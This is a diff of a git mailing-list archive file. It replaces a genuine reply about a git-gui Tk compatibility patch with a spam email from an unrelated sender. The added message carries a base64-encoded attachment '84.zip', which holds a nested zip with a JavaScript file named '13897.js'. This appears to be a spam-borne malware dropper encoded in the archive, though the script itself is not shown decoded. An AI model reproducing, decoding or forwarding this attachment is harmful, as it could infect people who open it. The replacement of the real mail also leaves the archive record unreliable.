@@ -1,96 +1,91 @@
 Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
-X-Spam-Level: 
+X-Spam-Level: *
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-4.2 required=3.0 tests=AWL,BAYES_00,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,
-	RP_MATCHES_RCVD shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=1.6 required=3.0 tests=BAYES_50,
+	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,ZIPFILE
+	shortcircuit=no autolearn=no autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 587BA1FAFB
-	for <e@80x24.org>; Fri, 31 Mar 2017 17:19:09 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id EF7EF1FAFB
+	for <e@80x24.org>; Fri, 31 Mar 2017 17:24:41 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S933304AbdCaRTI (ORCPT <rfc822;e@80x24.org>);
-        Fri, 31 Mar 2017 13:19:08 -0400
-Received: from pb-smtp2.pobox.com ([64.147.108.71]:51684 "EHLO
-        sasl.smtp.pobox.com" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
-        with ESMTP id S933153AbdCaRTH (ORCPT <rfc822;git@vger.kernel.org>);
-        Fri, 31 Mar 2017 13:19:07 -0400
-Received: from sasl.smtp.pobox.com (unknown [127.0.0.1])
-        by pb-smtp2.pobox.com (Postfix) with ESMTP id B7F9B7B8C5;
-        Fri, 31 Mar 2017 13:19:05 -0400 (EDT)
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=pobox.com; h=from:to:cc
-        :subject:references:date:in-reply-to:message-id:mime-version
-        :content-type; s=sasl; bh=GykgcfhEH6A9BVM4Ex7sgPc+koo=; b=rrlK3c
-        34Ow5zBu2mFoYErCWYhKiVHW+8sTC4g9+KUUHFlsHB0XKZ8L2AWxI5lpfZMMIdUL
-        bVg5imhcHKMAgkr0JL+zBQYslfFjznSrgcwQeVtDQPAV4EQu+9Dl564V6S+TvXqI
-        n5BEQkr13tuLKIjZ6LcitjBuBLjfQjFNiBexo=
-DomainKey-Signature: a=rsa-sha1; c=nofws; d=pobox.com; h=from:to:cc
-        :subject:references:date:in-reply-to:message-id:mime-version
-        :content-type; q=dns; s=sasl; b=D3s8xFQaMBssvxi6utPUaMyTUv6ExPkk
-        HgV/c5crgICr2Gj034S+sslXGh9vrSU1U/dyEAHOXy/D18JcmW9fPrGsZvitS8sa
-        4Uy68jxHtIJ4InnQrytkTHTSTBsl3+FHSRxi7RCH+mMols45VTPZXf+nqDge4nFW
-        4qwIeJe83i4=
-Received: from pb-smtp2.nyi.icgroup.com (unknown [127.0.0.1])
-        by pb-smtp2.pobox.com (Postfix) with ESMTP id B0A8F7B8C4;
-        Fri, 31 Mar 2017 13:19:05 -0400 (EDT)
-Received: from pobox.com (unknown [104.132.0.95])
-        (using TLSv1.2 with cipher DHE-RSA-AES128-SHA (128/128 bits))
-        (No client certificate requested)
-        by pb-smtp2.pobox.com (Postfix) with ESMTPSA id 063887B8C3;
-        Fri, 31 Mar 2017 13:19:05 -0400 (EDT)
-From:   Junio C Hamano <gitster@pobox.com>
-To:     Peter van der Does <peter@avirtualhome.com>
-Cc:     Pat Thoyts <patthoyts@users.sourceforge.net>, git@vger.kernel.org,
-        dshrader@lanl.gov, dennis@kaarsemaker.net, git@jessiehernandez.com,
-        kostix+git@007spb.ru
-Subject: Re: [PATCH] git-gui: Error on systems with TK < 8.6.0
-References: <c56892f3-602c-d684-5d07-a3ce3bab8189@avirtualhome.com>
-Date:   Fri, 31 Mar 2017 10:19:03 -0700
-In-Reply-To: <c56892f3-602c-d684-5d07-a3ce3bab8189@avirtualhome.com> (Peter
-        van der Does's message of "Fri, 31 Mar 2017 08:54:23 -0400")
-Message-ID: <xmqqlgrlz7nc.fsf@gitster.mtv.corp.google.com>
-User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/25.1.91 (gnu/linux)
+        id S933374AbdCaRYk (ORCPT <rfc822;e@80x24.org>);
+        Fri, 31 Mar 2017 13:24:40 -0400
+Received: from 197-248-197-106.safaricombusiness.co.ke ([197.248.197.106]:35572
+        "HELO safaricombusiness.co.ke" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S933359AbdCaRYj (ORCPT
+        <rfc822;git@vger.kernel.org>); Fri, 31 Mar 2017 13:24:39 -0400
+X-Greylist: delayed 314 seconds by postgrey-1.27 at vger.kernel.org; Fri, 31 Mar 2017 13:24:35 EDT
+Date:   Fri, 31 Mar 2017 17:24:14 -0000
+Importance: High
+Content-Disposition: attachment
+To:     "git" <git@vger.kernel.org>
+Content-Transfer-Encoding: base64
+Message-ID: <149098105488.27511.17210654989942310046@safaricombusiness.co.ke>
+From:   <tnatasha@braingain.co.za>
+Subject: 42305 git
+Reply-To: <tnatasha@braingain.co.za>
 MIME-Version: 1.0
-Content-Type: text/plain
-X-Pobox-Relay-ID: 244AD806-1636-11E7-B031-FC50AE2156B6-77302942!pb-smtp2.pobox.com
+Content-Type: application/zip; name="84.zip"
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-Peter van der Does <peter@avirtualhome.com> writes:
-
-> Using git-gui on systems that run a TK version below 8.6.0 results in a
-> crash when checking for the current theme.
->
-> Catch the error on those systems and use a different command to check
-> for the current theme.
-> ---
-
-Needs sign-off.  Also if you can make the patch against the git-gui
-project (the upstream project for this part of our tree, which has
-this file at lib/themed.tcl, not at git-gui/lib/themed.tcl) and send
-it to its maintainer (Cc'ed), it would be great.
-
-Thanks.
-
->  git-gui/lib/themed.tcl | 6 +++++-
->  1 file changed, 5 insertions(+), 1 deletion(-)
->
-> diff --git a/git-gui/lib/themed.tcl b/git-gui/lib/themed.tcl
-> index 351a712c8..bb4e8f25e 100644
-> --- a/git-gui/lib/themed.tcl
-> +++ b/git-gui/lib/themed.tcl
-> @@ -248,7 +248,11 @@ proc tspinbox {w args} {
->  proc ttext {w args} {
->  	global use_ttk
->  	if {$use_ttk} {
-> -		switch -- [ttk::style theme use] {
-> +		# Handle either current Tk or older versions of 8.5
-> +		if {[catch {set theme [ttk::style theme use]}]} {
-> +			set theme  $::ttk::currentTheme
-> +		}
-> +		switch -- $theme {
->  			"vista" - "xpnative" {
->  				lappend args -highlightthickness 0 -borderwidth 0
->  			}
+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
+BAAAAABQSwUGAAAAAAEAAQBPAAAALgwAAAAA
